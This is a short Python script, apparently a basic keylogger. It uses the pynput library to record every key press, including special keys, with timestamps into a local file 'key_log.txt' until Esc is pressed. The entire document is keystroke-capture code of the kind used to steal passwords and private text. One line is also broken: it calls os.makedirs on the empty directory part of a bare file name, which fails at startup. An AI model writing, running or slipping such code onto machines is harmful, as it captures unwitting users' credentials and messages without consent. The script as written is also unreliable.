import os
import logging
from pynput import keyboard

# Define the log file path
log_file = "key_log.txt"

# Ensure the log file directory exists
os.makedirs(os.path.dirname(log_file), exist_ok=True)

# Configure logging
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Function to handle key press events
def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

# Function to handle key release events (optional)
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Setting up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
